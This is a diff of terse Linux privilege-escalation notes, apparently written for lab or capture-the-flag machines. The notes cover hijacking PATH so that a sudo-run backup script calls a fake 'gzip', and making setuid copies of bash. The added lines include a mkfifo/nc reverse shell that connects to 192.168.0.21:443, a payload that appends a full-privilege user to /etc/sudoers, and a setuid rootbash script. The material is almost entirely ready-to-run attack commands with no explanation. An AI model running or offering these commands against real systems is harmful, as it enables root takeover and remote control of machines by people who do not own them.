@@ -10,7 +10,11 @@ chmod +x /home/user/overwrite.sh
 watch -n 1 ls -l /tmp
 /tmp/rootbash -p
 
+===================================
+Binary Check
 
+strings /usr/bin/menu
+ltrace /bin/whatever
 
 =================================== 
 Path Injecting Rootbash 
@@ -36,20 +40,42 @@ os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +s /tmp/rb
 
 
 =================================== 
-Path Inject
+Path Trick
 
-gzip -c /var/log/xyz
-strings /usr/bin/menu
-ltrace /bin/sysinfo
+sudo -l 
+/opt/scripts/access_backup.sh 
+ll /opt/scripts 
+cat /opt/scripts/access_backup.sh 
+gzip -c /var/log/apache2/access.log > blah,blah,access.gz 
+gzip is not full-path
 
-cd /tmp 
-echo /bin/sh > gzip
-chmod 777 gzip
-echo $PATH 
+which gzip /bin/gzip 
+echo $PATH
+export PATH=.:$PATH 
 export PATH=/tmp:$PATH
-/usr/bin/menu
-whoami
-root
+echo $PATH .:/usr/local/sbin:/usr/local/bin 
+
+vim priv1.txt 
+#!/bin/bash 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.21 443 > /tmp/f 
+  
+vim priv2.txt 
+#!/bin/bash 
+echo "m4lwhere  ALL=(ALL) ALL" >> /etc/sudoers 
+
+vim priv3.txt
+#!/bin/bash 
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+cp priv2.txt gzip 
+chmod +x gzip 
+
+Execute evil-gzip
+sudo /opt/scripts/access_backup.sh
+sudo su - 
+whoami 
+root 
 
 =================================== 
 C rootbash
